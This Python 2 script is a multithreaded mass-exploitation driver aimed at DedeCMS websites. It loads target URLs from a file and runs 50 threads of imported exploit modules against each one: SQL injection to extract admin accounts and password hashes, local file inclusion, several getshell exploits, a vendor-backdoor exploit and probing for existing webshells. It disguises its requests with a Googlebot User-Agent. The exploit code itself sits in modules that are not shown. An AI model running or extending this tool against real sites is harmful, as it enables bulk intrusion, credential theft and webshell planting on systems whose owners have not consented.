#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

import Class_Queue #消息队列机制
import time
import urllib2
import threading
import socket
socket.setdefaulttimeout(10)


################################
import bc_dedecms_search_php  #dedecms plus/search.php 注入漏洞-----------得到后台账号和md5(密码)
import bc_DedeCms_5x   #DedeCms 5.x 本地文件包含及物理路径泄露
import sql_dede_57_sp1   #dedecms search注入
import exp_dedecms_getshell   #dedecms漏洞getshell EXP鬼哥的洞洞
import exp_dedecms_yijuhua  #针对官方留下的后门
import exp_dedecms_8080_getshell  #guige dede 0.9-
import eval_cs #测试可能存在的一句话
################################


class class_Crun(threading.Thread):
    def __init__(self,i):
        threading.Thread.__init__(self)
        self.TH=i  #线程号

    def CS_webscan_url(self,URL): #扫描漏洞
        try:
            #DedeCms 5.x 本地文件包含及物理路径泄露
            threads = []
            threads.append(bc_DedeCms_5x.bc_DedeCms_5x(URL))  # 1. 创建线程
            for t in threads:  # 2. 启动线程
                t.start()
            for t in threads:   # 3. 等待结束，不然容易内存爆掉
                t.join()
            #dedecms plus/search.php 注入漏洞-----------得到后台账号和md5(密码)
            threads = []
            threads.append(bc_dedecms_search_php.bc_dedecms_search_php(URL))  # 1. 创建线程
            for t in threads:  # 2. 启动线程
                t.start()
            for t in threads:   # 3. 等待结束，不然容易内存爆掉
                t.join()
            #dedecms search注入
            threads = []
            threads.append(sql_dede_57_sp1.sql_dede_57_sp1(URL))  # 1. 创建线程
            for t in threads:  # 2. 启动线程
                t.start()
            for t in threads:   # 3. 等待结束，不然容易内存爆掉
                t.join()
            #dedecms漏洞getshell EXP鬼哥的洞洞
            threads = []
            threads.append(exp_dedecms_getshell.dedecms_getshell(URL))  # 1. 创建线程
            for t in threads:  # 2. 启动线程
                t.start()
            for t in threads:   # 3. 等待结束，不然容易内存爆掉
                t.join()
            #针对官方留下的后门
            threads = []
            threads.append(exp_dedecms_yijuhua.dedecms_yijuhua(URL))  # 1. 创建线程
            for t in threads:  # 2. 启动线程
                t.start()
            for t in threads:   # 3. 等待结束，不然容易内存爆掉
                t.join()
            #guige dede 0.9
            threads = []
            threads.append(exp_dedecms_8080_getshell.exp_dedecms_8080_getshell(URL))  # 1. 创建线程
            for t in threads:  # 2. 启动线程
                t.start()
            for t in threads:   # 3. 等待结束，不然容易内存爆掉
                t.join()
            #eval_cs #测试可能存在的一句话
            threads = []
            threads.append(eval_cs.eval_cs(URL))  # 1. 创建线程
            for t in threads:  # 2. 启动线程
                t.start()
            for t in threads:   # 3. 等待结束，不然容易内存爆掉
                t.join()

            time.sleep(0.5)
        except Exception,e:
            #print e
            return 0

    def open_url_data(self,url):  #读取网页内容
        try:
            req = urllib2.Request(url)
            req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
            s = urllib2.urlopen(req,timeout=10)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            #return s.read()
            if len(s.read())>=10:  #读取网页内容
                return True
            else:
                return False
        except:
            return False

    def run_webscan_url(self):  #扫描漏洞
        try:
            if Class_Queue.webscan_url.empty():   #判断队列是否为空
                print u"thread:%d webscan_url  已经没有可操作的URL了"%(self.TH)
                time.sleep(60)
            URL = Class_Queue.webscan_url.get(0.5)  #get()方法从队头删除并返回一个项目
            if not(("http://" in URL) or ("https://" in URL)):
                URL="http://"+URL
            if self.open_url_data(URL):  #判断网站是否能打开
                print u"thread:%d 开始扫描%s----time:%s"%(self.TH,URL,time.strftime('%Y.%m.%d-%H.%M.%S'))
                self.CS_webscan_url(URL) #扫描漏洞
        except Exception,e:
            #print e
            return 0

    def run(self):
        while True:
            try:
                self.run_webscan_url()
            except Exception,e:
                #print e
                return 0

def add_Queue():
    try:
        list=[]
        list_2=[]
        xxx = file(TXT_file, 'r')
        for xxx_line in xxx.readlines():  #读取数据
            #如果输入的内容读取有回车符号，可以用strip来消除，可得到完美的输出
            data=xxx_line.strip().lstrip()   #清除前后空格
            if len(data)<=7:
                continue   #跳过
            if not(("http://" in data) or ("https://" in data)):
                data="http://"+data
            Class_Queue.webscan_url.put(data,0.3)   #插入队列
        #            list.append(data)  #添加数据
        #        for i in list:  #去重重复数据
        #            if i not in list_2:
        #                list_2.append(i)
        #        for i in list_2:  #添加到数组
        #            Class_Queue.webscan_url.put(i,0.3)   #插入队列
    except Exception,e:
        return 0
################################################
if __name__=='__main__':
    print u"---------------------------------------------------------------------"
    print u"   软件只是娱乐测试  软件使用方法   main.exe url.txt     软件名 扫描URL"
    print u"                    针对dedecms 漏洞写的一些插件                      "
    print u"dedecms plus/search.php 注入漏洞-得到后台账号和md5(密码) bc_dedecms_search_php2.txt"
    print u"DedeCms 5.x 本地文件包含及物理路径泄露          bc_DedeCms_5x.txt"
    print u"dedecms search注入                             sql_dede_57_sp2.txt"
    print u"dedecms漏洞getshell EXP                        exp_dedecms_getshell.txt"
    print u"guige dede 0.9                                 exp_dedecms_8080_getshell.txt"
    print u"针对官方留下的后门                              exp_dedecms_yijuhua.txt"
    print u"批量测试有可能存在的  一句话                    exp_eval.txt"
    print u"--------有什么不完善的地方请大家联系我      BY:29295842@qq.com----------"
    print u"-----------------       time:---2015.2.24     ------------------------"
    print u"----------------------------------------------------------------------"
    global TXT_file #导入文本
    TXT_file = None
    #    TXT_file ="DedeCMS.txt"
    if len(sys.argv) < 2:
        print u"1_无参数传入"
        print u"1_无参数传入   \r\n软件使用方法   main.exe 1.txt     软件名 扫描URL "
        print u"2_手动输入文件名   \r\n请输入要扫描的url文件名如:DedeCMS.txt"
        TXT_file = str(raw_input("2_scan URL name:"))
    else:
        TXT_file=sys.argv[1]


    add_Queue()  #添加到消息队列
    time.sleep(1)
    #启动消息队列
    threads = []  #线程
    for i in range(1):  #nthreads=10  创建10个线程
        threads.append(Class_Queue.C_Queue())
    for t in threads:
        t.start()  #开始线程
    threads = []  #线程
    time.sleep(1)
    for i in range(1):  #nthreads=10  创建10个线程
        threads.append(Class_Queue.C_Queue())
    for t in threads:
        t.start()  #开始线程


    #Class_Queue.webscan_url.put("www.xfs66.com",0.3)   #插入队列
    threads = []  #线程
    for i in range(50):  #nthreads=10  创建10个线程
        threads.append(class_Crun(i+1,))
    for t in threads:
        t.start()  #开始线程
    for t in threads:
        t.join()  #等待线程，保持主进程